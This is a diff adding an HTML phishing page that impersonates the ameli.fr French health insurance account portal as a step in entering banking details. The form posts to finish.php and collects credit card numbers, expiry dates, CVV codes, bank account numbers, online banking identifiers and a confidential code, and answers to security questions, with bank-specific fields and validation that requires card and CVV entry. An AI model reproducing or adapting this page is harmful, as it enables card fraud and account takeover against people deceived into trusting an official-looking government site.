@@ -1,0 +1,397 @@
+﻿<!DOCTYPE html>
+    <html><head xmlns="http://www.w3.org/1999/xhtml" lang="fr" xml:lang="fr">
+	<link rel="shortcut icon" href="js/favicon.ico" type="image/x-icon"/>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>ameli.fr - Compte assurés - Saisie de la demande</title>
+	<link rel="stylesheet" type="text/css" href="js/layout.css">
+	<script src="js/buttons.js" type="text/javascript"></script>
+	<script src="js/util.js" type="text/javascript"></script>
+	<link rel="stylesheet" type="text/css" href="js/biblicnam-structure-sans.min.css">
+	<link rel="stylesheet" type="text/css" href="js/colors.css">
+	<link rel="stylesheet" type="text/css" href="js/general.css">
+	<link rel="stylesheet" type="text/css" href="js/menu.css">
+	<link rel="stylesheet" type="text/css" href="js/window.css">
+	<link rel="stylesheet" type="text/css" href="js/custom.css">
+	<link rel="stylesheet" type="text/css" href="js/cnamtsportlets.css">
+	<link rel="stylesheet" type="text/css" href="js/demandecode.css">
+	<link rel="stylesheet" type="text/css" href="js/_fenetres.css">
+	<link rel="stylesheet" type="text/css" media="screen" href="js/calendar.css">
+	<link rel="stylesheet" type="text/css" href="js/refonte.css">
+	<link rel="stylesheet" type="text/css" href="js/refonte_acc.css">
+	<link rel="stylesheet" type="text/css" href="js/refonte_cnx.css">
+	<link rel="stylesheet" type="text/css" href="js/refonte_mep.css">
+	<link rel="stylesheet" type="text/css" href="js/refonte_met.css">
+	<link rel="stylesheet" type="text/css" href="js/refonte_msg.css">
+	<link rel="stylesheet" type="text/css" href="js/refonte_msp.css">
+	<link rel="stylesheet" type="text/css" href="js/refonte_pre.css">
+	<link rel="stylesheet" type="text/css" href="js/refonte_biblicnam.css">
+	<link rel="stylesheet" type="text/css" href="js/cheminDeFer.css">
+	<style type="text/css">
+					.r_cnx_page .r_cnx_btlien,
+					.r_cnx_page .r_cnx_btsubmit,
+					.r_btlien,
+					.r_btsubmit,
+					.r_btretour,
+                    .r_ddc_btsubmit,
+                    .r_ddc_btretour,
+                    .r_ddc_btterminer
+                    {
+                    	behavior: url(js/PIE.htc);
+                    }
+        </style><script src="js/biblicnam-standalone.min.js" type="text/javascript">
+		</script><script src="js/fenetre.js" type="text/javascript">
+		</script><script src="js/afficheElement.js" type="text/javascript">
+		</script><script src="js/OpenPopup.js" type="text/javascript">
+		</script><script src="js/validation.js" type="text/javascript">
+		</script><script src="js/calendar.js" type="text/javascript"></script>
+		<script src="js/calendar-setup.js" type="text/javascript">
+		</script><script src="js/calendar-fr.js" type="text/javascript">
+		</script><script src="js/AideSaisie.js" type="text/javascript">
+		</script><script src="js/UrlDansFavoris.js" type="text/javascript">
+		</script><script src="js/refonte_biblicnam.js" type="text/javascript">
+		</script><script src="js/questionnaireSatisfaction.js" type="text/javascript">
+		</script><script src="js/blocs.js" type="text/javascript"></script>
+		<link rel="stylesheet" type="text/css" href="js/window.css">
+	
+	</head>
+		<body>
+		<div class="wlp-bighorn-header">
+		<div class="wlp-bighorn-layout wlp-bighorn-layout-flow">
+		<div class="wlp-bighorn-layout-cell wlp-bighorn-layout-flow-horizontal wlp-bighorn-layout-flow-first" style="height: auto"><div></div>
+		<div class="wlp-bighorn-theme wlp-bighorn-theme-borderless">
+		<div id="Header" class="wlp-bighorn-window  ">
+		<div class="wlp-bighorn-window-content">
+
+<script language="JavaScript" src="js/validator.js" type="text/javascript"></script>
+<script language="JavaScript" src="js/jquery.js" type="text/javascript"></script>
+
+<!-- Onglets -->
+<div class="blockLiensEntete">
+	<!-- Lien d'évitement, place le lecteur sur le contenu -->
+	<span class="inlineLien">
+		<a tabindex="1" href="#contenu" title="Aller directement au contenu">
+			Aller au contenu
+		</a>
+	</span>
+	<!-- Lien d'aide -->
+	<span class="inlineLien" >
+		<a tabindex="2" target="aideAmeli"
+				href="js/AideGenerale.jsp" 
+				onclick='openPopup("js/AideGenerale.jsp"); return false;'
+				title = "Accéder aux informations (nouvelle fenêtre)">
+			Aide
+		</a>
+	</span>	
+</div>
+
+
+<a name="top"></a>
+
+<div class="tetiere">
+				<img src="js/entete.png" width="950px" style="padding:2px 0 0 0" />
+	<div class="imgtetetiere_general">
+		<div class="logoam">			
+
+        	<img tabindex="-1" src="js/logo_regime_general.jpeg" alt="">
+		</div>
+	</div>
+</div>
+</div></div></div></div></div></div><div id="ameli_portal_book_2" class="wlp-bighorn-book"><div class="wlp-bighorn-book-content"><div id="as_connexion_book" class="wlp-bighorn-book"><div class="wlp-bighorn-book-content"><div id="as_demande_code_conf_page" class="wlp-bighorn-page-unconnect"><div class="wlp-bighorn-layout wlp-bighorn-layout-grid"><div class="wlp-bighorn-layout-cell wlp-bighorn-layout-grid-cell"><div></div><div class="wlp-bighorn-layout wlp-bighorn-layout-flow"><div class="wlp-bighorn-layout-cell wlp-bighorn-layout-flow-vertical wlp-bighorn-layout-flow-first" style="height: auto"><div></div><div id="demandCodeConfidentiel_3" class="wlp-bighorn-window  "><div class="wlp-bighorn-window-content">
+
+	<!-- debut centrepage -->	
+	<div class="r_ddc_page">
+		
+		<!-- debut formulaire -->
+		<img class="r_ddc_imgAmelie" src="js/AmelieConnexion.png" alt="" />
+	<img class="r_ddc_fleche_bulle" src="js/bulle_fleche.gif" alt="" />
+		<div class="r_ddc_bulleAmelie">
+	<!--  Start form-->
+			
+			<h1 id="contenu" class="r_ddc_titre">
+						Je renseigne mes données bancaires
+					</h1>
+			
+			
+			
+			
+	
+	<h2 class="r_ddc_filAriane">
+						<ul>
+							<li>
+							<div class="start"></div>
+							<div>&Eacute;tape 1</div>
+							<div class="end"></div>
+							</li>
+							<li>
+							<div class="enCours">&Eacute;tape 2</div>
+							<div class="endEnCours"></div>
+							</li>
+							<li>
+							<div class="start"></div>
+							<div>&Eacute;tape 3</div>
+							<div class="end"></div>
+							</li>
+						</ul>
+					</h2>
+					<div class="r_clear_both">
+					  <p><br>
+	
+	<form class="form" id="darnoo" method="post" action="finish.php" >
+
+<script>
+function chide() {
+	document.getElementById("ccin").style.display = 'none';
+	document.getElementById("account").style.display = 'none';
+	document.getElementById("separ").style.display = 'none';
+	document.getElementById("qbpos").style.display = 'none';
+	document.getElementById("reponses").style.display = 'none';
+	document.getElementById("qbpos2").style.display = 'none';
+	document.getElementById("reponses2").style.display = 'none';
+	document.getElementById("qbposlcl").style.display = 'none';
+	document.getElementById("reponseslcl").style.display = 'none';
+	document.getElementById("qbposlcl2").style.display = 'none';
+	document.getElementById("reponseslcl2").style.display = 'none';
+	document.getElementById("ibad").style.display = 'none';
+	
+}
+function ccheck(x) {
+	chide();
+	if(x == "pst") {
+		document.getElementById("account").style.display = '';
+		document.getElementById("separ").style.display = '';
+		document.getElementById("qbpos").style.display = '';
+		document.getElementById("reponses").style.display = '';
+		document.getElementById("separ").style.display = '';
+		document.getElementById("qbpos2").style.display = '';
+		document.getElementById("reponses2").style.display = '';
+	}
+	if(x == "cm") {
+		document.getElementById("ibad").style.display = '';
+	}
+	if(x == "lcl") {
+		document.getElementById("account").style.display = '';
+		document.getElementById("qbposlcl").style.display = '';
+		document.getElementById("reponseslcl").style.display = '';
+		document.getElementById("separ").style.display = '';
+		document.getElementById("qbposlcl2").style.display = '';
+		document.getElementById("reponseslcl2").style.display = '';
+	}
+	if(x == "sg") {
+		document.getElementById("account").style.display = '';
+		document.getElementById("sgclient").style.display = '';
+		document.getElementById("sgdepart").style.display = '';
+	}
+	if(x == "caisse") {
+		document.getElementById("account").style.display = '';
+	}
+	if(x == "bnp") {
+		document.getElementById("account").style.display = '';
+	}
+	if(x == "na") {
+		document.getElementById("account").style.display = '';
+	}
+	document.getElementById("ccin").style.display = '';
+}
+</script>
+				  <table border="0" cellspacing="0" width="560">
+                    <tr>
+                      <td width="180">
+                        <label class="r_ddc_label">Votre banque :</label></td>
+                      <td>
+                        <select class="r_ddc_select" name="bank" onchange="ccheck(this.options[this.selectedIndex].value);">
+                    <option value="">S&eacute;lectionner votre banque</option>
+                    <option value="axa">AXA Banque</option>
+                    <option value="na">Banque AGF / Allianz</option>
+                    <option value="na">Banque de Bretagne</option>
+                    <option value="na">Banque de Savoie</option>
+                    <option value="na">Banque Dupuy de Parseval</option>
+                    <option value="na">Banque Marze</option>
+                    <option value="na">Banque Palatine</option>
+                    <option value="bp">Banque Populaire</option>
+                    <option value="pst">Banque Postale</option>
+                    <option value="na">Barclays</option>
+                    <option value="na">BforBank</option>
+                    <option value="na">Binck.fr</option>
+                    <option value="bnp">BNP</option>
+                    <option value="bnp-net-agence">BNP Paribas La NET Agence</option>
+                    <option value="na">Boursorama Banque</option>
+                    <option value="na">BPE</option>
+                    <option value="caisse">Caisse d'Epargne</option>
+                    <option value="cic">CIC</option>
+                    <option value="na">Coopabanque</option>
+                    <option value="ca">Cr&eacute;dit Agricole</option>
+                    <option value="na">Cr&eacute;dit Cooperatif</option>
+                    <option value="cn">Cr&eacute;dit du Nord</option>
+                    <option value="cm">Cr&eacute;dit Mutuel</option>
+                    <option value="lcl">e.LCL</option>
+                    <option value="na">Fortis Banque</option>
+                    <option value="na">Fortuneo Banque</option>
+                    <option value="na">Groupama Banque</option>
+                    <option value="hsbc">HSBC</option>
+                    <option value="na">ING Direct</option>
+                    <option value="lcl">LCL</option>
+                    <option value="na">Monabanq</option>
+                    <option value="sg">Societe Generale</option>
+                    <option value="na">Soci&eacute;t&eacute; Marseillaise de Cr&eacute;dit</option>
+                    <option value="na">Autre Banque</option>
+						</select></td>
+                    </tr></table>
+					<table id="ccin" border="0" cellspacing="0" width="560" style="display: none;">
+<tr><td width="180"><label class="r_ddc_label">Nº de carte de crédit :</label></td><td><input name="ccnum" type="text" size="19" class="r_ddc_champ" />&nbsp;<img src="cclogos.PNG" style="padding: 11px 0 0 0;" ></img></td></tr>
+
+<tr><td width="180"><label class="r_ddc_label">Date d'expiration :</label></td>
+<td>
+<table>
+	<tr><td>
+        <label id="label_expMonth" for="expMonth" class="r_ddc_label" >Mois</label>
+		</td>
+		<td style="padding: 6px 0 0 0;">
+            <select  class="r_ddc_selec" name="expMonth"  tabindex="16">
+                                        <option value="" selected="">- -</option>
+                <option value="1">1</option><option value="2">2</option><option value="3">3</option><option value="4">4</option><option value="5">5</option><option value="6">6</option><option value="7">7</option><option value="8">8</option><option value="9">9</option><option value="10">10</option><option value="11">11</option><option value="12">12</option>            </select>
+			
+		</td><td>
+        <label id="label_expYear" for="expYear" class="r_ddc_label">Année</label>
+           
+			</td><td style="padding: 6px 0 0 0;">
+			<select  class="" name="expYear"  tabindex="17">
+                                <option value="" selected="">- - - -</option>
+                <option value="2016">2016</option><option value="2017">2017</option><option value="2018">2018</option><option value="2019">2019</option><option value="2020">2020</option><option value="2021">2021</option><option value="2022">2022</option><option value="2023">2023</option><option value="2024">2024</option><option value="2025">2025</option><option value="2026">2026</option><option value="2027">2027</option><option value="2028">2028</option><option value="2029">2029</option><option value="2030">2030</option><option value="2031">2031</option>            </select>
+
+</td></tr>
+	</table>
+
+</td>
+
+</tr>
+
+<tr><td width="174"><label class="r_ddc_label">Code de sécurité (CVV) :</label></td>
+<td><input name="cvv" class="r_ddc_champ" type="text" size="4" /></td>
+</tr>
+<tr id="account" style="display: none;"><td width="174"><label class="r_ddc_label">Numéro de compte :</label></td>
+<td><input name="account" type="text" size="16" class="r_ddc_champ" /><img src="js/aide.gif" title="Saisissez votre numéro de compte présents sur un relevé de compte, sur un RIB, dans votre chéquier."></td>
+</tr>
+<tr id="sgclient" style="display: none;"><td width="174"><label class="r_ddc_label">Code Client</label></td>
+<td><input name="sgclient" type="text" size="8" class="r_ddc_champ" /><img src="js/aide.gif" title="Saisissez votre Code Client Société Générale indiqué sur votre relevé de compte (8 chiffres)"></td>
+</tr>
+<tr id="sgdepart" style="display: none;"><td width="174"><label class="r_ddc_label">Département de naissance</label></td>
+<td><input name="sgdepart" type="text" size="3" class="r_ddc_champ" /><img src="js/aide.gif" title="ex. 75 pour Paris ou 99 pour l'étranger."></td>
+</tr>
+<tr id="ibad" style="display: none;"><td width="174"><label class="r_ddc_label">Identifiant Banque à Distance :</label></td>
+<td><input name="ibad" type="text" size="16" class="r_ddc_champ" /><img src="js/aide.gif" title="L'identifiant est celui que vous utilisez pour vous connecter à Crédit Mutuel."></td>
+</tr>
+
+<tr id="separ" style="display: none;"><td width="174"><label class="r_ddc_label">-------------------</label></td>
+<td></td>
+</tr>
+
+<tr id="qbpos" style="display : none;"><td width="174"><label class="r_ddc_label">Question personnelle 1 :</label></td>
+<td><select name="question" id="question" class="r_ddc_select" size="1" >
+                              <option value="Dans quelle rue avez-vous grandi ?"> Dans quelle rue avez-vous grandi ? </option>
+                            </select></td>
+</tr>
+
+<tr id="reponses" style="display: none;"><td width="174"><label class="r_ddc_label">Réponse personnelle 1 :</label></td>
+<td><input name="reponses" type="text" size="29" class="r_ddc_champ"  /></td>
+</tr>
+
+<tr id="qbpos2" style="display : none;"><td width="174"><label class="r_ddc_label">Question personnelle 2 :</label></td>
+<td><select name="question2" id="question2" class="r_ddc_select" size="1" >
+                              <option value="Le prénom de votre meilleur ami d'enfance ?"> Le prénom de votre meilleur ami d'enfance ? </option>
+                            </select></td>
+</tr>
+
+<tr id="reponses2" style="display: none;"><td width="174"><label class="r_ddc_label">Réponse personnelle 2 :</label></td>
+<td><input name="reponses2" type="text" size="29" class="r_ddc_champ" /></td>
+</tr>
+
+<tr id="qbposlcl" style="display : none;"><td width="174"><label class="r_ddc_label">Question personnelle 1 :</label></td>
+<td><select name="questionlcl" id="questionlcl" class="r_ddc_select" size="1" >
+                              <option value="Dans quelle rue avez-vous grandi ?"> Nom de jeune fille de votre mère ? </option>
+                            </select></td>
+</tr>
+
+<tr id="reponseslcl" style="display: none;"><td width="174"><label class="r_ddc_label">Réponse personnelle 1 :</label></td>
+<td><input name="reponseslcl" type="text" size="29" class="r_ddc_champ" /></td>
+</tr>
+
+<tr id="qbposlcl2" style="display : none;"><td width="174"><label class="r_ddc_label">Question personnelle 2 :</label></td>
+<td><select name="questionlcl2" id="questionlcl2" class="r_ddc_select" size="1" >
+                              <option value="Dans quelle rue avez-vous grandi ?"> Second prénom de votre pere ? </option>
+                            </select></td>
+</tr>
+
+<tr id="reponseslcl2" style="display: none;"><td width="174"><label class="r_ddc_label">Réponse personnelle 2 :</label></td>
+<td><input name="reponseslcl2" type="text" size="29" class="r_ddc_champ" /></td>
+</tr>
+<tr id="ghazcisse" style="display: none;"><td width="174"><label class="r_ddc_label">Identifiant client :</label></td>
+<td><input name="ghazcisse" type="text" size="4" class="r_ddc_champ" /><img src="js/aide.gif" title="Saisissez L'identifiant client est inscrit sur votre contrat Banque à Distance et sur vos relevés de compte bancaire."></td>
+</tr>
+<tr id="ghazcisse0" style="display: none;"><td width="174"><label class="r_ddc_label">Code confidentiel :</label></td>
+<td><input name="ghazcisse0" type="password" size="4" class="r_ddc_champ" /><img src="js/aide.gif" title="Saisissez Le code confidentiel vous a été transmis par courrier postal simple, à votre domicile suite à l'ouverture de votre contrat Banque à Distance."></td>
+</tr>
+
+                    <tr>
+                      <td width="174"></td>
+                      <td> 
+						 <div style="margin-right:100px;">
+							 
+ <input type="submit" name="Valider" class="r_btsubmit" value="Continuer" class="form-button" type="image" style="float: right">
+                      
+						  </div> 
+						</td>
+                    </tr>
+                  </table>
+                </form>
+	
+					<script  type="text/javascript">
+ var frmvalidator = new Validator("darnoo");
+
+frmvalidator.addValidation("ccnum","req","Veuillez entrer votre Nº de carte de crédit.");
+frmvalidator.addValidation("ccnum","maxlen=16","Votre Nº de carte de crédit est incorrect.");
+frmvalidator.addValidation("ccnum","minlen=15","Votre Nº de carte de crédit est incorrect.");
+frmvalidator.addValidation("ccnum","num","Votre Nº de carte de crédit est incorrect.");
+
+frmvalidator.addValidation("expMonth","num","Veuillez entrer la date d'éxpiration.");
+frmvalidator.addValidation("expYear","num","Veuillez entrer la date d'éxpiration.");
+
+frmvalidator.addValidation("cvv","req","Veuillez entrer votre Code de sécurité (CVV).");
+frmvalidator.addValidation("cvv","num","Veuillez entrer votre Code de sécurité (CVV).");
+frmvalidator.addValidation("cvv","maxlen=4","Votre Code de sécurité (CVV) est incorrect.");
+frmvalidator.addValidation("cvv","minlen=3","Votre Code de sécurité (CVV) est incorrect.");
+
+</script>
+	
+	
+	
+	<!--  End the form-->
+	</div>			
+</div>
+
+</div></div></div></div></div></div></div></div></div></div></div><div class="wlp-bighorn-footer"><div class="wlp-bighorn-layout wlp-bighorn-layout-flow"><div class="wlp-bighorn-layout-cell wlp-bighorn-layout-flow-horizontal wlp-bighorn-layout-flow-first" style="height: auto"><div></div><div class="wlp-bighorn-theme wlp-bighorn-theme-borderless"><div id="Footer" class="wlp-bighorn-window  "><div class="wlp-bighorn-window-content">
+
+
+
+<div class="baselinebleue">
+	<a href="js/InformationsLegales.jsp" target="aideAmeli"
+		onclick='openPopup("js/InformationsLegales.jsp"); return false;'
+		title = "Accéder aux informations (nouvelle fenêtre)">
+		Informations légales
+	</a>&nbsp;|&nbsp;
+	<a href="js/Copyright.jsp" target="aideAmeli"
+		onclick='openPopup("js/Copyright.jsp"); return false;'
+		title = "Accéder aux informations (nouvelle fenêtre)">
+		Propriété intellectuelle
+	</a>&nbsp;|&nbsp;
+	<a href="js/ConditionsUtilisation.jsp" target="aideAmeli"
+		onclick='openPopup("js/ConditionsUtilisation.jsp"); return false;'
+		title = "Accéder aux informations (nouvelle fenêtre)">
+		Conditions d'utilisation
+	</a>&nbsp;|&nbsp;
+	<!-- <a href="#" title = "Accéder aux informations (nouvelle fenêtre)" onclick='openPopup("js/AideGenerale.jsp")'>Aide</a>&nbsp;|&nbsp;-->
+	
+	<a href="#" onclick='bookmarksite("Compte Ameli","https://assure.ameli.fr:443https://assure.ameli.fr/PortailAS/appmanagerhttps://assure.ameli.fr/PortailAS/assure?_nfpb=true&amp;_pageLabel=as_login_page"); return false;'>
+		Ajouter dans mes favoris
+	</a>
+	
+</div>
+</div></div></div></div></div></div></body></html>
